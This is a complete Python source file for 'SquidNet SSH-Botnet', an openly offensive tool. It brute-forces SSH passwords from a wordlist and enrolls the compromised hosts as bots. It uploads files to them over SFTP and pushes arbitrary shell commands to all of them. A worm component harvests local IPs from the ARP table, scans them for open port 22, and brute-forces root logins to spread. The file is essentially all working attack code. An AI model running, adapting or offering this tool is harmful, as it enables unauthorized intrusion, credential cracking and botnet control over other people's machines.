import paramiko, socket, threading, sys, os
from optparse import OptionParser
class SSH_Botnet:
    def __init__(self, passw_txt, capture_output):
        self.pass_list = passw_txt
        self.cwd = os.getcwd()
        self.passwords = self.configure_passwords()
        self.ssh_bots = []
        self.ips = []
        self.logo()
        self.usage()
        self.display_bots = []
        try:
            self.capture_output = bool(capture_output)
        except:
            self.capture_output = False
        self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.instructor = threading.Thread(target=self.instruct)
        self.instructor.start()
        self.ssh_botlist = []
    def logo(self):
        print("""
  _____             _     _        _____ _____ _    _  ____        _              ___      ____   ___  
 / ____|           (_)   | |      / ____/ ____| |  | ||  _ \      | |            | \ \    / /_ | / _ \ 
| (___   __ _ _   _ _  __| |_____| (___| (___ | |__| || |_) | ___ | |_ _ __   ___| |\ \  / / | || | | |
 \___ \ / _` | | | | |/ _` |______\___ \ ___ \|  __  ||  _ < / _ \| __| '_ \ / _ \ __\ \/ /  | || | | |
 ____) | (_| | |_| | | (_| |      ____) |___) | |  | || |_) | (_) | |_| | | |  __/ |_ \  /   | || |_| |
|_____/ \__, |\__,_|_|\__,_|     |_____/_____/|_|  |_||____/ \___/ \__|_| |_|\___|\__| \/    |_(_)___/ 
           | |                                                                                               
           |_|                                                                                               
SSH-Botnet By DrSquid                                                            """)
    def usage(self):
        print("""
[+] !help                     - Displays All Commands
[+] !login [ip] [user] [pass] - Attempts to Log into the ip with the user with the provided password.
[+] !infect [ip] [username]   - Attempts to break into the hostname with the ip provided.
[+] !inject [filename]        - Opens SFTP and uploads a file to the bots.
[+] !networkinfect [cfg]      - Attempts to infect all the devices on the network(optional cfg file)
[+] !clear                    - Clears all of the output of this script.
[+] Any other commands will be sent to the bots as cmd commands.
        """)
    def configure_passwords(self):
        file = open(self.pass_list,'r')
        passwords = file.readlines()
        return passwords
    def infect(self, ip, username):
        error_count = 0
        print(f"[+] Brute Forcing the Password for: {username}@{ip}")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        flag = 0
        for password in self.passwords:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                passw = password.strip()
                client.connect(ip, 22, username, passw)
                print(f"\n[!] {ip}'s Password has been found!: {passw}")
                print(f"[!] Adding {username}@{ip} to the botnet.\n")
                self.ips.append(ip)
                self.display_bots.append(f"{username}@{ip}")
                self.ssh_bots.append(client)
                self.ssh_botlist.append(str(client)+' '+str(username))
                flag = 1
                break
            except Exception as e:
                client.close()
        if flag == 0:
            print(f"[?] Unable to Brute Force password for {username}@{ip}")
    def inject(self, client, file):
        if "/" in file or "\\" in file:
            result = ""
            for letter in file:
                if letter == "/" or letter == "\\":
                    result += " "
                else:
                    result += letter
            split_result = result.split()
            file = split_result[(len(split_result)-1)]
            file_dir = ""
            for item in split_result:
                if item == file:
                    pass
                else:
                    file_dir = file_dir + item + "/"
            os.chdir(file_dir)
        for usernames in self.ssh_botlist:
            if str(client) in usernames:
                split_item = usernames.split()
                username = split_item[4]
        try:
            sftp = client.open_sftp()
            sftp.put(file, f'C:/{username}/{file}')
        except:
            sftp = client.open_sftp()
            sftp.put(file, f'/Users/{username}/{file}')
        os.chdir(self.cwd)
    def send_instruction(self, instruction):
        for bot in self.ssh_bots:
            try:
                if self.capture_output:
                    for usernames in self.ssh_botlist:
                        if str(bot) in usernames:
                            split_item = usernames.split()
                            username = split_item[4]
                    stdin, stdout, stderr = bot.exec_command(instruction, get_pty=True)
                    stdin.close()
                    output = stdout.read().decode()
                    if output.strip() == "":
                        pass
                    else:
                        print(f"\n[({username})]: {output.strip()}")
                else:
                    bot.exec_command(instruction)
            except:
                pass
    def reg_login(self, ip, username, password):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            print(f"[+] Attempting to login to {username}@{ip} with: {password}")
            client.connect(ip, 22, username, password)
            print(f"\n[!] Access Granted!")
            print(f"[!] Adding {username}@{ip} to the Botnet.\n")
            Botnet.ssh_bots.append(client)
            Botnet.ssh_botlist.append(str(client) + ' ' + str(username))
            Botnet.display_bots.append(f"{username}@{ip}")
        except:
            print("[+] Authentication Failed. Try to check your inputs.")
    def network_infect(self, config_file=None):
        if config_file != None:
            Replicator = Worm(self.pass_list, config_file)
        else:
            Replicator = Worm(self.pass_list)
    def instruct(self):
        while True:
            try:
                self.instruction = input("[+] Enter your instruction: ")
                if self.instruction.startswith("!infect"):
                    msg_split = self.instruction.split()
                    targ_ip = msg_split[1]
                    user = msg_split[2]
                    infector = threading.Thread(target=self.infect, args=(targ_ip, user))
                    infector.start()
                elif self.instruction.startswith("!inject"):
                    msg_split = self.instruction.split()
                    filename = msg_split[1]
                    for bot in self.ssh_bots:
                        injector = threading.Thread(target=self.inject, args=(bot, filename))
                        injector.start()
                elif self.instruction.startswith("!listbots"):
                    print(f"[+] List of Bots: {self.display_bots}")
                elif self.instruction.startswith("!networkinfect"):
                    msg_split = self.instruction.split()
                    try:
                        cfg_file = msg_split[1]
                        network_infector = threading.Thread(target=self.network_infect, args=(cfg_file,))
                        network_infector.start()
                    except:
                        network_infector = threading.Thread(target=self.network_infect)
                        network_infector.start()
                elif self.instruction.startswith("!clear"):
                    if sys.platform == "win32":
                        os.system('cls')
                    else:
                        os.system('clear')
                    self.logo()
                    self.usage()
                elif self.instruction.startswith("!login"):
                    msg_split = self.instruction.split()
                    ip = msg_split[1]
                    username = msg_split[2]
                    password = msg_split[3]
                    self.reg_login(ip,username,password)
                elif self.instruction.startswith("!help"):
                    self.usage()
                else:
                    sender = threading.Thread(target=self.send_instruction, args=(self.instruction,))
                    sender.start()
            except:
                pass
class Worm:
    def __init__(self, passw_file,cfg_file=None):
        self.cfg_file = cfg_file
        self.has_cfg = False
        if self.cfg_file != None:
            self.cfg_contents, self.ls_contents = self.cfg(self.cfg_file)
        self.os_ls = ['windows','apple','linux']
        self.ips = os.popen('arp -a').readlines()
        self.possiblevictims = self.identify_victims()
        self.passwords_cracked = 0
        self.passwords_scanned = 0
        self.passw_file = passw_file
        self.victims = []
        self.ips_scanned = 0
        print(f"\n[+] List of Possible Hosts: {self.possiblevictims}")
        print("[+] Initiating Port Scan.....")
        self.passwords = self.obtain_passw()
        self.port_scanner = threading.Thread(target=self.begin_port_scan)
        self.port_scanner.start()
    def cfg(self, filename):
        file = open(filename, "r")
        contents = file.read()
        file.close()
        file = open(filename, "r")
        ls_contents = file.readlines()
        file.close()
        if "CFGFORWORM" in contents:
            self.has_cfg = True
            print("[+] A Config file has been provided.")
            return contents, ls_contents
        else:
            return None
    def initiate_threads(self):
        self.laster = threading.Thread(target=self.output_item)
        self.laster.start()
        while True:
            try:
                if self.ips_scanned == len(self.possiblevictims):
                    if len(self.victims) == 0:
                        print("\n[+] No Hosts with Port 22 Open.")
                    else:
                        for ip in self.victims:
                            if self.has_cfg:
                                if ip in self.cfg_contents:
                                    if ip not in self.victims:
                                        print(f"[+] {ip} is in config file, but not in victim list.\n[+] Ignoring.........")
                                    else:
                                        for line in self.ls_contents:
                                            if ip in line:
                                                try:
                                                    ipcfg = line.split()
                                                    try:
                                                        username = ipcfg[1]
                                                    except:
                                                        username = "root"
                                                except:
                                                    pass
                                else:
                                    username = "root"
                            else:
                                username = "root"
                            victim = threading.Thread(target=self.victimlogin, args=(ip, username))
                            victim.start()
                    break
            except:
                pass
    def begin_port_scan(self):
        for ip in self.possiblevictims:
            try:
                print(f"\n[+] Scanning {ip}.....")
                portscanner = threading.Thread(target=self.port_scan, args=(ip,))
                portscanner.start()
            except:
                pass
        self.initiate_threads()
    def port_scan(self, ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 22))
            self.victims.append(ip)
            print(f"\n[!] {ip} has 22 as an open Port.")
        except:
            print(f"\n[+] {ip} does not have 22 as an open port.")
        s.close()
        self.ips_scanned += 1
    def obtain_passw(self):
        with open(self.passw_file, "r") as file:
            passwords = file.readlines()
        return passwords
    def identify_victims(self):
        victims = []
        if sys.platform == "win32":
            for lines in self.ips:
                try:
                    line = lines.split()
                    ip = line[0]
                    checker = int(ip[0])
                    victims.append(ip)
                except:
                    pass
        elif sys.platform == "darwin":
            for lines in self.ips:
                try:
                    line = lines.split()
                    ip = line[1]
                    ip = ip.strip('()')
                    checker = int(ip[0])
                    victims.append(ip)
                except:
                    pass
        return victims
    def output_item(self):
        while True:
            try:
                if self.passwords_scanned == len(self.victims):
                    break
            except:
                pass
    def victimlogin(self, ip, username="root"):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print(f"[+] Attempting to Brute Force Password for IP: {ip}")
        flag = 0
        for password in self.passwords:
            try:
                password = password.strip()
                client.connect(ip, 22, username, password)
                flag = 1
                break
            except:
                pass
        if flag == 1:
            self.passwords_scanned += 1
            print(f"\n[!] {ip}'s Password has been Cracked!: {password}")
            print(f"[!] Adding {username}@{ip} to the Botnet.\n")
            Botnet.ssh_bots.append(client)
            Botnet.ssh_botlist.append(str(client) + ' ' + str(username))
            Botnet.display_bots.append(f"{username}@{ip}")
        else:
            print(f"\n[?] {ip}'s Password was unable to be cracked.")
            self.passwords_scanned += 1
class OptionParse:
    def __init__(self):
        if len(sys.argv) < 2:
            self.usage()
        else:
            self.get_args()
    def usage(self):
        SSH_Botnet.logo(None)
        print("""
[+] Option-Parsing Help:
[+] --pL, --passlist - Specifies the Brute Forcing TxT File.
[+] --cO, --captopt  - Specify whether to capture bot output or not.
[+] --i,  --info     - Shows this message.

[+] Usage:""")
        if sys.argv[0].endswith(".py"):
            print("[+] python3 SquidNetSSH.py --pL <passlist> --cO <bool>")
            print("[+] python3 SquidNetSSH.py --i")
        else:
            print("[+] SquidNetSSH --pL <passlist> --cO <bool>")
            print("[+] SquidNetSSH --i")
    def get_args(self):
        self.opts = OptionParser()
        self.opts.add_option("--pL","--passlist",dest="passlist")
        self.opts.add_option("--cO", "--captopt", dest="captopt")
        self.opts.add_option("--i","--info",dest="info",action="store_true")
        args, opt = self.opts.parse_args()
        if args.passlist is None:
            self.usage()
        else:
            passlist = args.passlist
        if args.captopt is None:
            captopt = True
        else:
            try:
                captopt = bool(args.captopt)
            except:
                captopt = True
        Botnet = SSH_Botnet(passlist, captopt)
optionparser = OptionParse()
